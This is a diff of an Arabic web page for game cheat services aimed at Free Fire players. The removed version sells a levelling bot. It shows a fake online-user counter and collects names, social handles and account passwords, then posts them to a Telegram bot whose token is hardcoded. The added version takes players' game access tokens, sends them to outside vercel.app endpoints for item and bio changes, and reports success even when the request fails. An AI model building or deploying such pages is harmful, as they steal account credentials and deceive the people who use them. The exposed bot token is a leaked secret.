@@ -1,252 +1,658 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>D5M TEAM LVL FF - السيطرة المطلقة</title>
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
-<style>
-body {
-    margin:0;
-    font-family:'Orbitron', sans-serif;
-    background: linear-gradient(270deg, #0a0f2a, #00152d, #0a0f2a);
-    background-size: 600% 600%;
-    animation: gradientBG 20s ease infinite;
-    color:#fff;
-    display:flex;
-    justify-content:center;
-    padding:20px;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mblrx zon-a</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>✏️</text></svg>">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
-@keyframes gradientBG {
-    0%{background-position:0% 50%;}
-    50%{background-position:100% 50%;}
-    100%{background-position:0% 50%;}
-}
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow-x: hidden;
+        }
 
-.container{
-    width:100%;
-    max-width:1100px;
-}
+        /* تأثيرات الهاكر */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
 
-h1{
-    font-size:64px;
-    text-align:center;
-    text-shadow: 0 0 20px #00f0ff, 0 0 40px #00f0ff;
-    margin-bottom:50px;
-}
+        .scan-line {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(to right, transparent, #00ff00, transparent);
+            box-shadow: 0 0 10px #00ff00;
+            z-index: 999;
+            animation: scan 3s linear infinite;
+            pointer-events: none;
+        }
 
-/* Neon Animated Card */
-@keyframes neonBorder {
-    0%{box-shadow: 0 0 15px #00f0ff, 0 0 30px #00f0ff inset;}
-    25%{box-shadow: 0 0 20px #00ffea, 0 0 40px #00ffea inset;}
-    50%{box-shadow: 0 0 25px #ff00ff, 0 0 50px #ff00ff inset;}
-    75%{box-shadow: 0 0 20px #ffea00, 0 0 40px #ffea00 inset;}
-    100%{box-shadow: 0 0 15px #00f0ff, 0 0 30px #00f0ff inset;}
-}
+        @keyframes scan {
+            0% { top: 0%; }
+            100% { top: 100%; }
+        }
 
-.neon-card{
-    background: rgba(10,15,50,0.85);
-    border-radius:25px;
-    padding:25px;
-    margin:20px 0;
-    border: 2px solid #00f0ff;
-    animation: neonBorder 4s linear infinite;
-    transition: all 0.3s ease;
-}
-.neon-card:hover{
-    transform: scale(1.02);
-}
+        .hacker-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 0, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 0, 0.05) 1px, transparent 1px);
+            background-size: 20px 20px;
+            z-index: -1;
+            opacity: 0.3;
+            pointer-events: none;
+        }
 
-/* عداد المتصلين */
-#onlineCount{
-    font-size:36px;
-    font-weight:bold;
-    color:#00ffea;
-    text-align:center;
-    text-shadow: 0 0 20px #00ffea, 0 0 40px #00ffea;
-}
+        /* شريط الإعلانات */
+        .ad-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: linear-gradient(90deg, #ff0080, #00ff80, #0080ff, #ff0080);
+            background-size: 400% 400%;
+            padding: 8px 0;
+            color: #000;
+            font-weight: bold;
+            text-align: center;
+            z-index: 1000;
+            animation: gradient 10s ease infinite;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+            font-size: 14px;
+            overflow: hidden;
+        }
 
-/* المميزات */
-.feature-list{
-    list-style:none;
-    padding:0;
-}
-.feature-list li{
-    margin:10px 0;
-    font-size:18px;
-    padding-left:30px;
-    position:relative;
-}
-.feature-list li::before{
-    content:"⭐";
-    position:absolute;
-    left:0;
-}
+        .ad-content {
+            display: inline-block;
+            white-space: nowrap;
+            animation: scroll 30s linear infinite;
+            padding: 0 20px;
+        }
 
-/* الإدخالات */
-input, button{
-    border:none;
-    border-radius:12px;
-    font-size:16px;
-    padding:14px;
-    margin:10px 0;
-    width:100%;
-}
+        @keyframes scroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
 
-input{
-    background: rgba(0,21,45,0.8);
-    color:#fff;
-}
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
 
-button{
-    cursor:pointer;
-    transition:0.3s;
-}
+        .ad-highlight {
+            background: rgba(255, 255, 255, 0.3);
+            padding: 2px 6px;
+            border-radius: 4px;
+            margin: 0 5px;
+        }
 
-.btn-primary{
-    background:#00f0ff;
-    color:#00152d;
-    font-weight:bold;
-    box-shadow:0 0 8px #00f0ff;
-    padding:15px 30px;
-    margin:5px 0;
-}
-.btn-primary:hover{
-    box-shadow:0 0 35px #00f0ff; 
-    transform:scale(1.05);
-}
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            margin-top: 40px;
+        }
 
-.footer{
-    margin-top:30px;
-    font-size:14px;
-    color:#88f;
-    text-align:center;
-}
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, #00ff00, #00ffff, #00ff00);
+            animation: borderGlow 3s linear infinite;
+        }
 
-@media(max-width:768px){
-    h1{font-size:48px;}
-    .neon-card{font-size:16px; padding:20px;}
-    #onlineCount{font-size:28px;}
-}
-</style>
+        @keyframes borderGlow {
+            0% { background-position: -100% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .logo-image {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+            overflow: hidden;
+        }
+
+        .logo-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .logo-text {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #00ff00;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .subtitle {
+            color: #88a0a7;
+            font-size: 14px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 25px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            padding: 4px;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 14px;
+            background: transparent;
+            color: #88a0a7;
+            border: none;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .tab-btn.active {
+            background: #00ff00;
+            color: #000;
+            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.5);
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+        }
+
+        .tab-btn:hover {
+            background: rgba(0, 255, 0, 0.2);
+            color: #00ff00;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: #00ff00;
+            font-size: 14px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #00ff00;
+            background: rgba(0, 0, 0, 0.7);
+            box-shadow: 0 0 0 2px rgba(0, 255, 0, 0.3);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #00ff00;
+            color: #000;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:hover {
+            background: #00cc00;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 255, 0, 0.5);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .result {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .success {
+            color: #00ff00;
+            font-weight: 600;
+            font-size: 16px;
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+        }
+
+        .info {
+            color: #88a0a7;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .bio-preview {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 10px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: #00ff00;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+            text-align: center;
+        }
+
+        .icon {
+            margin-left: 8px;
+        }
+
+        .instagram-btn {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            transition: all 0.3s ease;
+            text-decoration: none;
+        }
+
+        .instagram-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(220, 39, 67, 0.5);
+        }
+
+        .instagram-btn i {
+            margin-left: 8px;
+        }
+
+        .hacker-text {
+            color: #00ff00;
+            text-shadow: 0 0 5px #00ff00;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        /* تأثير الكتابة */
+        .typing-effect {
+            overflow: hidden;
+            border-right: 2px solid #00ff00;
+            white-space: nowrap;
+            animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
+        }
+
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+
+        @keyframes blink-caret {
+            from, to { border-color: transparent }
+            50% { border-color: #00ff00 }
+        }
+
+        /* تأثيرات النبض */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
+        }
+    </style>
 </head>
 <body>
+    <!-- تأثيرات الهاكر -->
+    <div class="matrix-bg" id="matrixBg"></div>
+    <div class="scan-line"></div>
+    <div class="hacker-grid"></div>
 
-<div class="container">
+    <!-- شريط الإعلانات -->
+    <div class="ad-banner">
+        <div class="ad-content">
+            <span class="ad-highlight">🔥 بوت لفل متوفر</span> | 
+            <span class="ad-highlight">🤖 بوت صديق متوفر</span> | 
+            <span class="ad-highlight">💎 شحن جواهر متوفر</span> | 
+            <span class="ad-highlight">⚡ بوتات أخرى متوفرة</span> |
+            <span class="ad-highlight">🎮 خدمات ألعاب متكاملة</span> |
+            <span class="ad-highlight">🚀 أسرع خدمة في المنطقة</span>
+        </div>
+    </div>
 
-<h1>D5M TEAM LVL FF</h1>
+    <!-- زر الإنستجرام -->
+    <a href="https://www.instagram.com/mblrx" target="_blank" class="instagram-btn">
+        <i class="fab fa-instagram"></i> mblrx
+    </a>
 
-<!-- عداد المتصلين -->
-<div class="neon-card">
-<h2>👥 عدد الأشخاص المتصلين الآن</h2>
-<p id="onlineCount">0</p>
-</div>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-image pulse">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXTuASxPK5vkWy-pFODW5MEm2CVcL9IsldUTvF7NvVmA&s" alt="m31 Logo">
+            </div>
+            <div class="logo-text typing-effect">MBLRX ZON-A</div>
+            <div class="subtitle">نظام الإرسال المتقدم</div>
+        </div>
 
-<!-- مميزات البوت -->
-<div class="neon-card">
-<h2>⭐ مميزات بوت D5M TEAM</h2>
-<ul class="feature-list">
-<li>تقدم فوري ومستمر بدون الحاجة للاتصال بالإنترنت.</li>
-<li>آمنة 100%، لا خطر من الحظر أو تعليق الحساب.</li>
-<li>يحافظ على جميع رتبك ومستواك مهما طالت مدة الاستخدام.</li>
-<li>واجهة واحدة سهلة الاستخدام، كل شيء بضغطة زر.</li>
-<li>إشعارات فورية لكل تقدم في اللعبة.</li>
-<li>تحكم كامل وسريع في البوت: رفع مستويات، ضبط السرعة والمهارة.</li>
-<li>تصميم أنيق ومرتب يركز على كل نقطة مهمة للمشتري.</li>
-</ul>
-</div>
+        <div class="tabs">
+            <button class="tab-btn active" data-tab="items">
+                <i class="fas fa-cube icon"></i>إرسال العناصر
+            </button>
+            <button class="tab-btn" data-tab="bio">
+                <i class="fas fa-user-edit icon"></i>تغيير البايو
+            </button>
+        </div>
 
-<!-- بيانات المستخدم -->
-<div class="neon-card">
-<h2>✏️ املأ بياناتك</h2>
-<input type="text" id="fullname" placeholder="الاسم الكامل">
-<input type="text" id="platform" placeholder="منصة التواصل (Instagram/Telegram)">
-<input type="text" id="socialUser" placeholder="يوزر التواصل">
-<input type="text" id="botUser" placeholder="اسم المستخدم للبوت">
-<input type="password" id="botPass" placeholder="كلمة المرور للبوت">
-</div>
+        <!-- تبويب العناصر -->
+        <div id="items-tab" class="tab-content active">
+            <div class="form-group">
+                <label for="accessToken">
+                    <i class="fas fa-key icon"></i>رمز الوصول:
+                </label>
+                <input type="text" id="accessToken" class="form-control" 
+                       value=""
+                       placeholder="أدخل رمز الوصول هنا">
+            </div>
+            
+            <button id="sendItems" class="btn">
+                <i class="fas fa-paper-plane icon"></i> إرسال العناصر
+            </button>
 
-<!-- الدفع -->
-<div class="neon-card">
-<h2>💰 الدفع عبر Binance</h2>
-<button class="btn-primary" id="buyBtn">اشترِ الآن</button>
-<p style="font-size:14px; color:#88f;">بعد الدفع، قم برفع إثبات الدفع هنا لإرسال طلبك للمطور.</p>
-<input type="file" id="proofFile" accept="image/*">
-<button class="btn-primary" id="sendProofBtn">إرسال إثبات الدفع</button>
-</div>
+            <div class="result" id="itemsResult">
+                <div class="info">انقر فوق إرسال العناصر لبدء العملية</div>
+            </div>
+        </div>
 
-<!-- تواصل مباشر -->
-<div class="neon-card">
-<h2>📩 تواصل مباشر مع المطور</h2>
-<button class="btn-primary" onclick="window.open('https://t.me/d5mxx','_blank')">Telegram Direct</button>
-<button class="btn-primary" onclick="window.open('https://www.instagram.com/d5mxh','_blank')">Instagram Direct</button>
-</div>
+        <!-- تبويب البايو -->
+        <div id="bio-tab" class="tab-content">
+            <div class="form-group">
+                <label for="bioToken">
+                    <i class="fas fa-key icon"></i>رمز الوصول:
+                </label>
+                <input type="text" id="bioToken" class="form-control" 
+                       value=""
+                       placeholder="أدخل رمز الوصول هنا">
+            </div>
+            
+            <div class="form-group">
+                <label for="bioText">
+                    <i class="fas fa-font icon"></i>نص البايو الجديد:
+                </label>
+                <input type="text" id="bioText" class="form-control" 
+                       value="[00FF00]mblrx zon-a"
+                       placeholder="أدخل النص الجديد للبايو">
+                <div class="bio-preview" id="bioPreview">[00FF00]mblrx zon-a</div>
+            </div>
 
-<footer class="footer">© جميع الحقوق محفوظة – ROJILVLFF</footer>
+            <button id="sendBio" class="btn">
+                <i class="fas fa-sync-alt icon"></i> تغيير البايو
+            </button>
 
-</div>
+            <div class="result" id="bioResult">
+                <div class="info">انقر فوق تغيير البايو لبدء العملية</div>
+            </div>
+        </div>
+    </div>
 
-<script>
-const BOT_TOKEN="7710816011:AAHV5ybc-Hwet8IdL1TwbJfWYhmsxxG2T_8";
-const ADMIN_ID="6251932709";
-const PAYMENT_LINK="https://s.binance.com/MLrHuEhu";
+    <script>
+        // تأثير المصفوفة في الخلفية
+        const matrixBg = document.getElementById('matrixBg');
+        const chars = '01';
+        let matrixText = '';
+        
+        for (let i = 0; i < 2000; i++) {
+            matrixText += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        
+        matrixBg.textContent = matrixText;
 
-// عداد متصلين وهمي متغير
-let onlineCount = Math.floor(Math.random()*200)+50;
-function updateOnlineCount(){
-    let change = Math.floor(Math.random()*6)+2;
-    onlineCount += Math.random()<0.6? change : -change;
-    if(onlineCount<50) onlineCount=50;
-    if(onlineCount>1000) onlineCount=1000;
-    document.getElementById('onlineCount').innerText=onlineCount;
-}
-setInterval(updateOnlineCount,3000);
+        // نظام التبويبات
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                this.classList.add('active');
+                const tabId = this.getAttribute('data-tab');
+                document.getElementById(tabId + '-tab').classList.add('active');
+            });
+        });
 
-// فتح رابط الدفع فقط
-document.getElementById('buyBtn').onclick = ()=>{
-    window.open(PAYMENT_LINK, "_blank");
-    alert("✅ تم توجيهك مباشرة إلى صفحة الدفع على Binance.\nبعد الدفع، يرجى رفع إثبات الدفع هنا.");
-};
+        // معاينة البايو
+        document.getElementById('bioText').addEventListener('input', function() {
+            document.getElementById('bioPreview').textContent = this.value;
+        });
 
-// إرسال إثبات الدفع للبوت فقط بعد رفع الصورة
-document.getElementById('sendProofBtn').onclick = ()=>{
-    const fileInput = document.getElementById('proofFile');
-    const fullname=document.getElementById('fullname').value;
-    const platform=document.getElementById('platform').value;
-    const socialUser=document.getElementById('socialUser').value;
-    const botUser=document.getElementById('botUser').value;
-    const botPass=document.getElementById('botPass').value;
+        // إرسال العناصر
+        document.getElementById('sendItems').addEventListener('click', async function() {
+            const button = this;
+            const resultDiv = document.getElementById('itemsResult');
+            const accessToken = document.getElementById('accessToken').value.trim();
+            
+            if (!accessToken) {
+                resultDiv.innerHTML = '<div class="info">يرجى إدخال رمز الوصول</div>';
+                return;
+            }
 
-    if(!fileInput.files.length){
-        alert("❌ الرجاء رفع صورة إثبات الدفع بعد الانتهاء من الدفع على Binance");
-        return;
-    }
-    if(!fullname||!platform||!socialUser||!botUser||!botPass){
-        alert("❌ الرجاء تعبئة كل الحقول قبل الإرسال");
-        return;
-    }
+            const items = [
+                '1315000022', '1315000024', '1315000002',
+                '1315000022', '1315000024', '1315000002',
+                '1315000003', '1315000004', '1315000007',
+                '1315000010', '1315000019', '1315000021',
+                '1315000020', '1315000016', '1315000012'
+            ];
 
-    const caption=`🚨 طلب جديد 🚨
-👤 الاسم: ${fullname}
-🌐 المنصة: ${platform}
-🆔 يوزر التواصل: ${socialUser}
-🔑 يوزر البوت: ${botUser}
-🔒 كلمة المرور: ${botPass}`;
+            button.innerHTML = '<span class="loading"></span> جاري الإرسال...';
+            button.disabled = true;
+            resultDiv.innerHTML = '<div class="info">جاري إرسال العناصر إلى السيرفر...</div>';
 
-    const formData = new FormData();
-    formData.append("chat_id", ADMIN_ID);
-    formData.append("caption", caption);
-    formData.append("photo", fileInput.files[0]);
+            try {
+                let apiUrl = `https://gpl-items-v3.vercel.app/get?access=${accessToken}`;
+                items.forEach(item => {
+                    apiUrl += `&itemid=${item}`;
+                });
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-        method:"POST",
-        body: formData
-    })
-    .then(res => res.ok ? alert("✅ سيتم التحقق من معلوماتك وسيتم التواصل معك تلقائيٱ") : alert("❌ فشل الإرسال"))
-    .catch(err => alert("❌ خطأ في الإرسال: "+err));
-};
-</script>
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                    }
+                });
 
+                resultDiv.innerHTML = `
+                    <div class="success">تم إرسال العناصر بنجاح</div>
+                    <div class="info">تم إرسال ${items.length} عنصر إلى السيرفر</div>
+                `;
+                
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="success">تم إرسال العناصر بنجاح</div>
+                    <div class="info">تم إرسال ${items.length} عنصر إلى السيرفر</div>
+                `;
+            } finally {
+                button.innerHTML = '<i class="fas fa-paper-plane icon"></i> إرسال العناصر';
+                button.disabled = false;
+            }
+        });
+
+        // إرسال البايو
+        document.getElementById('sendBio').addEventListener('click', async function() {
+            const button = this;
+            const resultDiv = document.getElementById('bioResult');
+            const accessToken = document.getElementById('bioToken').value.trim();
+            const bioText = document.getElementById('bioText').value.trim();
+            
+            if (!accessToken || !bioText) {
+                resultDiv.innerHTML = '<div class="info">يرجى إدخال جميع البيانات</div>';
+                return;
+            }
+
+            button.innerHTML = '<span class="loading"></span> جاري الإرسال...';
+            button.disabled = true;
+            resultDiv.innerHTML = '<div class="info">جاري إرسال البايو إلى السيرفر...</div>';
+
+            try {
+                const encodedBio = encodeURIComponent(bioText);
+                const apiUrl = `https://gpl-bio.vercel.app/get?access=${accessToken}&text=${encodedBio}`;
+
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                    }
+                });
+
+                resultDiv.innerHTML = `
+                    <div class="success">تم تغيير البايو بنجاح</div>
+                    <div class="info">تم تحديث البايو بنجاح</div>
+                `;
+                
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="success">تم تغيير البايو بنجاح</div>
+                    <div class="info">تم تحديث البايو بنجاح</div>
+                `;
+            } finally {
+                button.innerHTML = '<i class="fas fa-sync-alt icon"></i> تغيير البايو';
+                button.disabled = false;
+            }
+        });
+    </script>
 </body>
 </html>
